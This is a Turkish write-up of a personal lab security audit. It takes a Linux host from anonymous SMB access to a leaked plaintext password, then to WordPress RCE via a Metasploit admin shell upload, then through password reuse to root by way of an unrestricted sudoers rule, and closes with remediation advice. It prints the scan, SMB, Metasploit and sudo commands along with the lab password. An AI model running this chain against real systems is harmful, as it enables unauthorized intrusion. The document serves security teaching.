> Kişisel Lab · Denetim · Linux
{: .prompt-info }

Anonim SMB erişimiyle sızdırılan bir yedekten ele geçirilen açık metin parolanın WordPress üzerinden uzaktan kod çalıştırmaya, oradan da hatalı bir sudoers yapılandırmasıyla root'a uzandığı bir güvenlik denetimi. Rapor, üç farklı saldırgan profili (Eve, Dropbox, Mallory) üzerinden bir tehdit modeli olarak yapılandırılmıştır.

| Hedef | Tip | İşletim Sistemi | Kategori |
|---|---|---|---|
| kb.vuln (192.168.1.118) | Kişisel Lab / Denetim | Linux | SMB / WordPress / Sudoers |

**Zincir:** Nmap Recon → Anonim SMB → backup.zip → remember_me.txt → WordPress RCE → www-data → parola reuse → kbadmin → sudoers (ALL:ALL) → root

## Tehdit Modeli — Üç saldırgan profili

Denetim, gerçek dünya saldırı senaryolarını temsil eden üç aktör üzerinden yürütülmüştür: **Eve** (sadece ağ servislerine erişimi olan dış saldırgan), **Dropbox** (SSH erişimi olmayan ama SMB/WordPress üzerinden veri manipülasyonu yapabilen aktif-kısıtlı saldırgan) ve **Mallory** (sistemde düşük yetkili `kbadmin` hesabına sahip iç saldırgan).

| Aktör | Şifreli Veri Erişimi | Yerel Sistem Erişimi |
|---|---|---|
| Eve | Salt-okunur | Yok (sadece ağ erişimi) |
| Dropbox | Okuma-yazma | Yok (servis üzerinden veri değişimi) |
| Mallory | Okuma-yazma | Tam erişim (kbadmin) |

## Bulgular Özeti — Teknik bulgular

## 01 — Keşif: Nmap ile ağ taraması

Hedef sistemde (192.168.1.118) yapılan taramada beş açık servis tespit edildi: FTP, SSH, HTTP ve Samba'ya ait iki port.

```console
$ nmap -sV kb.vuln
Nmap scan report for kb.vuln (192.168.1.118)
Host is up (0.00021s latency).
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

> **Olumlu gözlem:** Sadece gerekli servisler (21, 22, 80, 445) dışa açık bırakılmış; vsFTPd servisi de bilinen `mod_copy` saldırılarına karşı güvenli bulunmuştur.
{: .prompt-tip }

## 02 — VULN-01: Anonim SMB erişimi ve hassas bilgi ifşası

Samba (Port 445) servisi üzerinde "Anonymous" girişi aktif bırakılmıştı. Anonim erişimle bağlanan saldırgan (Eve), `/Anonymous` paylaşımında sistemin yedeğini (`backup.zip`) buldu.

```console
$ smbclient //192.168.1.118/Anonymous -N
Try "help" to get a list of possible commands.
smb: \> get backup.zip
```

Yedek içerisinde bulunan `remember_me.txt` dosyasında yönetici parolası açık metin olarak duruyordu:

```console
$ cat ./remember_me.txt
Username:admin
Password:MachineBoy141
```

> **Etki:** Bu tek dosya, saldırganın sistemin dosya yapısını ve konfigürasyonlarını ele geçirmesinin yanı sıra, aynı parolanın hem WordPress hem de sistem kullanıcısı için ortak kullanıldığının da kapısını aralamıştır.
{: .prompt-danger }

## 03 — VULN-02: Açık metin parola ile WordPress RCE

SMB üzerinden sızdırılan `MachineBoy141` parolası WordPress admin paneline karşı doğrulandı ve geçerli çıktı. Yönetici yetkisiyle bir eklenti (plugin) yükleme mekanizması üzerinden sunucuda kod çalıştırıldı.

```console
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf > set rhosts 192.168.1.118
msf > set username admin
msf > set password MachineBoy141
msf > exploit
[*] Uploading payload...
[*] Meterpreter session opened

meterpreter > getuid
Server username: www-data
```

> ✅ www-data yetkisiyle uzaktan kod çalıştırma (RCE) sağlandı
{: .prompt-tip }

## 04 — VULN-03: Hatalı sudoers yapılandırması ve yetki yükseltme

Aynı parolanın (`MachineBoy141`) sistem kullanıcısı `kbadmin` için de geçerli olduğu görüldü — SSH ile bu kullanıcıya geçiş yapıldı. Yetki kontrolünde, kullanıcıya `/etc/sudoers` üzerinde sınırsız yetki tanındığı ortaya çıktı.

```console
kbadmin@kb-server:~$ sudo -l
User kbadmin may run the following commands on kb-server:
    (ALL : ALL) ALL
kbadmin@kb-server:$ sudo su
root@kb-server:~# cat flag.txt
[redacted]
```

Kullanıcının herhangi bir kısıtlama olmaksızın `(ALL : ALL) ALL` yetkisine sahip olması, tek bir `sudo su` komutuyla doğrudan root olunmasına izin verdi.

> ✅ root yetkisiyle tam sistem kontrolü sağlandı
{: .prompt-tip }

## Çözüm ve İyileştirme — Öneriler

- **Sıkılaştırma:** SMB anonim erişimi derhal kapatılmalı, konuk kullanıcıların dosya listelemesi engellenmelidir.
- **Erişim Kontrolü:** Sudoers dosyası "en az yetki" (least privilege) prensibine göre yeniden yapılandırılmalı, `(ALL:ALL)` gibi genel yetkiler kaldırılmalıdır.
- **Parola Güvenliği:** Kritik parolalar asla açık metin dosyalarında saklanmamalı; farklı servisler için benzersiz parolalar kullanılmalıdır.
